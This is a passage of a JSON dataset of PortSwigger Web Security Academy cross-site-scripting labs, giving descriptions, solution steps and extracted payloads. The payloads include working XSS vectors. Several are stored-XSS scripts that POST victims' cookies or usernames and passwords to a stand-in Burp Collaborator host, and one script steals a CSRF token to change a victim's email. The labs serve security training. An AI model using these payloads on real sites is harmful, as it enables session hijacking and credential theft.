    "category": "cross-site-scripting",
    "title": "Reflected DOM XSS",
    "description": "This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.",
    "solution_steps": [
      "In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.",
      "Back in the lab, go to the target website and use the search bar to search for a random test string, such as \"XSS\" .",
      "Return to the Proxy tool in Burp Suite and forward the request.",
      "On the Intercept tab, notice that the string is reflected in a JSON response called search-results .",
      "From the Site Map, open the searchResults.js file and notice that the JSON response is used with an eval() function call.",
      "By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.",
      "To solve this lab, enter the following search term: \\\"-alert(1)}//"
    ],
    "solution": "1. In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.\n2. Back in the lab, go to the target website and use the search bar to search for a random test string, such as \"XSS\" .\n3. Return to the Proxy tool in Burp Suite and forward the request.\n4. On the Intercept tab, notice that the string is reflected in a JSON response called search-results .\n5. From the Site Map, open the searchResults.js file and notice that the JSON response is used with an eval() function call.\n6. By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.\n7. To solve this lab, enter the following search term: \\\"-alert(1)}//",
    "payloads": [
      "alert()",
      "\"XSS\"",
      "search-results",
      "searchResults.js",
      "eval()",
      "\\\"-alert(1)}//",
      "{\"searchTerm\":\"\\\\\"-alert(1)}//\", \"results\":[]}"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored",
    "category": "cross-site-scripting",
    "title": "Stored DOM XSS",
    "description": "This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call thealert()function.",
    "solution": "Post a comment containing the following vector:\n<><img src=1 onerror=alert(1)>\nIn an attempt to prevent XSS, the website uses the JavaScript\nreplace()\nfunction to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.",
    "payloads": [
      "alert()",
      "<><img src=1 onerror=alert(1)>",
      "replace()"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink",
    "category": "cross-site-scripting",
    "title": "DOM XSS ininnerHTMLsink using sourcelocation.search",
    "description": "This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses aninnerHTMLassignment, which changes the HTML contents of adivelement, using data fromlocation.search.",
    "solution_steps": [
      "Enter the following into the into the search box: <img src=1 onerror=alert(1)>",
      "Click \"Search\"."
    ],
    "solution": "1. Enter the following into the into the search box: <img src=1 onerror=alert(1)>\n2. Click \"Search\".",
    "payloads": [
      "innerHTML",
      "location.search",
      "alert",
      "<img src=1 onerror=alert(1)>",
      "onerror",
      "alert()"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink",
    "category": "cross-site-scripting",
    "title": "DOM XSS in jQuery anchorhrefattribute sink usinglocation.searchsource",
    "description": "This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's$selector function to find an anchor element, and changes itshrefattribute using data fromlocation.search.",
    "solution_steps": [
      "On the Submit feedback page, change the query parameter returnPath to / followed by a random alphanumeric string.",
      "Right-click and inspect the element, and observe that your random string has been placed inside an a href attribute.",
      "Change returnPath to: javascript:alert(document.cookie) Hit enter and click \"back\"."
    ],
    "solution": "1. On the Submit feedback page, change the query parameter returnPath to / followed by a random alphanumeric string.\n2. Right-click and inspect the element, and observe that your random string has been placed inside an a href attribute.\n3. Change returnPath to: javascript:alert(document.cookie) Hit enter and click \"back\".",
    "payloads": [
      "href",
      "location.search",
      "document.cookie",
      "returnPath",
      "javascript:alert(document.cookie)"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event",
    "category": "cross-site-scripting",
    "title": "DOM XSS in jQuery selector sink using a hashchange event",
    "description": "This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's$()selector function to auto-scroll to a given post, whose title is passed via thelocation.hashproperty.",
    "solution_steps": [
      "Notice the vulnerable code on the home page using Burp or the browser's DevTools.",
      "From the lab banner, open the exploit server.",
      "In the Body section, add the following malicious iframe : <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/#\" onload=\"this.src+='<img src=x onerror=print()>'\"></iframe>",
      "Store the exploit, then click View exploit to confirm that the print() function is called.",
      "Go back to the exploit server and click Deliver to victim to solve the lab."
    ],
    "solution": "1. Notice the vulnerable code on the home page using Burp or the browser's DevTools.\n2. From the lab banner, open the exploit server.\n3. In the Body section, add the following malicious iframe : <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/#\" onload=\"this.src+='<img src=x onerror=print()>'\"></iframe>\n4. Store the exploit, then click View exploit to confirm that the print() function is called.\n5. Go back to the exploit server and click Deliver to victim to solve the lab.",
    "payloads": [
      "location.hash",
      "print()",
      "iframe",
      "<iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/#\" onload=\"this.src+='<img src=x onerror=print()>'\"></iframe>"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords",
    "category": "cross-site-scripting",
    "title": "Exploiting cross-site scripting to capture passwords",
    "description": "This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.",
    "solution_steps": [
      "Using Burp Suite Professional, go to the Collaborator tab.",
      "Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.",
      "Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated: <input name=username id=username>\n<input type=password name=password onchange=\"if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{\nmethod:'POST',\nmode: 'no-cors',\nbody:username.value+':'+this.value\n});\"> This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.",
      "Go back to the Collaborator tab, and click \"Poll now\". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.",
      "Take a note of the value of the victim's username and password in the POST body.",
      "Use the credentials to log in as the victim user."
    ],
    "solution": "1. Using Burp Suite Professional, go to the Collaborator tab.\n2. Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.\n3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated: <input name=username id=username>\n<input type=password name=password onchange=\"if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{\nmethod:'POST',\nmode: 'no-cors',\nbody:username.value+':'+this.value\n});\"> This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.\n4. Go back to the Collaborator tab, and click \"Poll now\". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.\n5. Take a note of the value of the victim's username and password in the POST body.\n6. Use the credentials to log in as the victim user.",
    "payloads": [
      "<input name=username id=username>\n<input type=password name=password onchange=\"if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{\nmethod:'POST',\nmode: 'no-cors',\nbody:username.value+':'+this.value\n});\">"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf",
    "category": "cross-site-scripting",
    "title": "Exploiting XSS to bypass CSRF defenses",
    "description": "This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.",
    "solution": "You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, use a different email address for the final exploit you deliver to the victim.",
    "payloads": [
      "wiener:peter",
      "/my-account/change-email",
      "email",
      "token",
      "<script>\nvar req = new XMLHttpRequest();\nreq.onload = handleResponse;\nreq.open('get','/my-account',true);\nreq.send();\nfunction handleResponse() {\n    var token = this.responseText.match(/name=\"csrf\" value=\"(\\w+)\"/)[1];\n    var changeReq = new XMLHttpRequest();\n    changeReq.open('post', '/my-account/change-email', true);\n    changeReq.send('csrf='+token+'&email=test@test.com')\n};\n</script>",
      "test@test.com"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies",
    "category": "cross-site-scripting",
    "title": "Exploiting cross-site scripting to steal cookies",
    "description": "This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.",
    "solution_steps": [
      "Using Burp Suite Professional, go to the Collaborator tab.",
      "Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.",
      "Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated: <script>\nfetch('https://BURP-COLLABORATOR-SUBDOMAIN', {\nmethod: 'POST',\nmode: 'no-cors',\nbody:document.cookie\n});\n</script> This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.",
      "Go back to the Collaborator tab, and click \"Poll now\". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.",
      "Take a note of the value of the victim's cookie in the POST body.",
      "Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account to load the admin user's account page."
    ],
    "solution": "1. Using Burp Suite Professional, go to the Collaborator tab.\n2. Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.\n3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated: <script>\nfetch('https://BURP-COLLABORATOR-SUBDOMAIN', {\nmethod: 'POST',\nmode: 'no-cors',\nbody:document.cookie\n});\n</script> This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.\n4. Go back to the Collaborator tab, and click \"Poll now\". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.\n5. Take a note of the value of the victim's cookie in the POST body.\n6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account to load the admin user's account page.",
    "payloads": [
      "<script>\nfetch('https://BURP-COLLABORATOR-SUBDOMAIN', {\nmethod: 'POST',\nmode: 'no-cors',\nbody:document.cookie\n});\n</script>",
      "/my-account"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded",
    "category": "cross-site-scripting",
    "title": "Reflected XSS into HTML context with nothing encoded",
    "description": "This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.",
    "solution_steps": [
      "Copy and paste the following into the search box: <script>alert(1)</script>",
      "Click \"Search\"."
    ],
    "solution": "1. Copy and paste the following into the search box: <script>alert(1)</script>\n2. Click \"Search\".",
    "payloads": [
      "alert",
      "<script>alert(1)</script>"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded",
    "category": "cross-site-scripting",
    "title": "Stored XSS into HTML context with nothing encoded",
    "description": "This lab contains a stored cross-site scripting vulnerability in the comment functionality.",
    "solution_steps": [
      "Enter the following into the comment box: <script>alert(1)</script>",
      "Enter a name, email and website.",
      "Click \"Post comment\".",
      "Go back to the blog."
    ],
    "solution": "1. Enter the following into the comment box: <script>alert(1)</script>\n2. Enter a name, email and website.\n3. Click \"Post comment\".\n4. Go back to the blog.",
    "payloads": [
      "alert",
      "<script>alert(1)</script>"
    ]
  }
]